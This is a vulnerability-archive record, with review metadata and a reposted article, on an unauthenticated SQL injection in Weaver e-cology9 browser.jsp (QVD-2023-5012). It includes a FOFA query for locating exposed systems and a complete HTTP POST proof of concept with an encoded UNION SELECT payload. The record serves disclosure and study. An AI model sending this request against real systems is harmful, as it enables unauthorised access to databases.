---
source: "MrWQ/vulnerability-paper"
title: "泛微e-cology browser.jsp未授权SQL注入"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "QVD-2023-5012"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "e-cology9<=10.55"
prerequisites: "声称无需认证；空格路径/多重编码"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://mp.weixin.qq.com/s/GkyolTxMwj5qClEg80C5CQ"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/QVD-2023-5012%E2%80%94%E6%B3%9B%E5%BE%AE%20e-cology9%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-5c89289e995c5247d641564a"
entity_id: "ve-5c89289e995c5247d641564a"
schema_version: "1"
previous_fofa_unverified: "语句**"
fofa: "app=\"泛微-协同商务系统\""
---

# 泛微e-cology browser.jsp未授权SQL注入

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

## 条目说明

- 对象与具体问题：泛微e-cology；browser.jsp未授权SQL注入
- 版本、配置及部署条件：e-cology9<=10.55
- 认证与权限前提：声称无需认证；空格路径/多重编码
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- QVD-2023-5012错误放cnvd字段；fofa误抽为语句**
- 代码缺头体空行，只有截图结果，重复免责声明很长

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GkyolTxMwj5qClEg80C5CQ)

**漏洞简介**

泛微 e-cology9 中存在 SQL 注入漏洞，未经身份认证的远程攻击者即可利用此漏洞获取数据库敏感信息，进一步利用可能导致目标系统被控。  

**影响版本**

```
泛微e-cology9<=10.55

```

**FOFA 语句**

```
app="泛微-协同商务系统"

```

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVysra7ItOufZQ85GXBSX9vYEvqn38fbicMcG1L6UViaG4exFiaHLDMIk3nsrB2LHKToz0IrkQsJia38rA/640?wx_fmt=png)

**漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVysra7ItOufZQ85GXBSX9vYicvk9sjNhyzW8g2yRGRJeBHXh7uicU1RqZ8Qickh6DrHjsB9eTRcT0Jcg/640?wx_fmt=png)

POC：  

```http
POST /mobile/%20/plugin/browser.jsp HTTP/1.1
Host: ****
Content-Type: application/x-www-form-urlencoded
Connection: close
isDis=1&browserTypeId=269&keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537

```

![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVysra7ItOufZQ85GXBSX9vYrRJIYW9lHsUwpS6gqQCllXhDz6GdWn4q8mPlvCcOqxFwwlp5YB2Q4Q/640?wx_fmt=png)

**修复建议**

建议升级至安全版本  

![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVysra7ItOufZQ85GXBSX9vYa0PicnDzIv4xibegRTm4976s4ZMcq0Ke9uH8TG8RqC4ZbaXK33IrmicxA/640?wx_fmt=jpeg)  

**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**公众号**内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**

**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
